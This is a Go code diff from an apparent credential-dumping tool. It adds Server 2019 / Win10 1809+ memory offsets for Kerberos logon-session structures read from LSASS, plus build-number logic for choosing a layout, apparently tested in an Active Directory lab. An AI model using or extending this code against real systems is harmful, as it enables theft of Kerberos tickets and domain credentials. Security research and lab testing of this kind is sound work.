@@ -160,8 +160,23 @@ type kerbSessionLayout struct {
 
 var kerbSessionLayouts = []kerbSessionLayout{
 	{
-		// Win10 1607+ / Server 2019 / Win11 (KIWI_KERBEROS_LOGON_SESSION_10_1607)
-		Name:         "Win10_1607_Win11",
+		// Server 2019 (build 17763) / Win10 1809+ / Win11
+		// KIWI_KERBEROS_LOGON_SESSION_10_1607_X — has 0x18 extra bytes vs the
+		// base 1607 layout (additional fields before LUID). Validated against
+		// GOAD DC01 (Server 2019 build 17763) hex dump in S437.
+		Name:         "Win10_1809_Win11",
+		ListEntryOff: 0x08,
+		LUIDOff:      0x60,
+		UserNameOff:  0xA0,
+		DomainOff:    0xB0,
+		Tickets1Off:  0x110,
+		Tickets2Off:  0x120,
+		Tickets3Off:  0x130,
+		NodeReadSize: 0x148,
+	},
+	{
+		// Win10 1607-1803 / Server 2016 (KIWI_KERBEROS_LOGON_SESSION_10_1607)
+		Name:         "Win10_1607",
 		ListEntryOff: 0x08,
 		LUIDOff:      0x48,
 		UserNameOff:  0x88,
@@ -685,8 +700,11 @@ func extractKerbTickets(r lsassReader, sessionRaw []byte, sessionBase uintptr, s
 // Windows build number. Falls back to the newest layout if build is unknown.
 func selectKerbLayouts(buildNumber uint32) (kerbSessionLayout, kerbTicketLayout) {
 	if buildNumber > 0 && buildNumber < 14393 {
-		return kerbSessionLayouts[1], kerbTicketLayouts[1] // Win10 1507
+		return kerbSessionLayouts[2], kerbTicketLayouts[1] // Win10 1507
 	}
-	return kerbSessionLayouts[0], kerbTicketLayouts[0] // Win10 1607+
+	if buildNumber >= 17763 {
+		return kerbSessionLayouts[0], kerbTicketLayouts[0] // Server 2019+ / Win10 1809+
+	}
+	return kerbSessionLayouts[1], kerbTicketLayouts[0] // Win10 1607-1803
 }
 
